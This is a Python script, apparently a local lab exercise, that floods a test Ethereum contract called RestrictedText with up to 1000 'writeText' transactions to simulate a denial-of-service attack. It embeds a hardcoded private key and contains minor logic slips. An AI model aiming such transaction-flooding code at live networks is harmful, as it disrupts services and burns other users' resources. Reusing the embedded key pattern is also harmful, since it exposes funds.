from web3 import Web3, HTTPProvider
import threading
import traceback

from brownie import project, accounts, network

# Load the Brownie project
p = project.load('brownie-dir')
p.load_config()

# Get the ABI and bytecode of RestrictedText contract
RestrictedText = p.RestrictedText
res_abi = p.RestrictedText.abi
res_bytecode = p.RestrictedText.bytecode


# Setup Web3 provider
w3 = Web3(HTTPProvider('http://localhost:8545'))

# Address of the deployed RestrictedText contract
contract_address = "0xE20fEeB180423eEE0ffC2d4C0C48E9C188d60Cac"  # Update with your contract address

# Global flag to control the DoS attack simulation
dos_attack_running = True

# Function for successful DoS attack simulation
def dos_attack(limit):
    global dos_attack_running
    attack_count = 0
    while dos_attack_running and attack_count < limit:
        if attack_count >= limit:
            print("DoS simulation succeed")
            break
        try:
            print(attack_count)
            tx = w3.eth.contract(address=str(contract_address), abi=res_abi).functions.writeText("DoS attack!").build_transaction({
                'from': str(accounts.add('0xb18c7ac56c1e40ba65419cf95cc68dd94e469f3d76408290cc5935fa0447df47')),
                'gas': 2000000,
                'gasPrice': w3.eth.gas_price
            })
            tx_hash = w3.eth.send_transaction(tx)
            tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
           
           
        except Exception as e:
            #print(f"Error: {e}")
            #traceback.print_exc()
            print('error')
        
        attack_count += 1
            
   

# # Start the DoS attack in a separate thread
# dos_thread = threading.Thread(target=dos_attack(10))
# dos_thread.start()
dos_attack(1000)

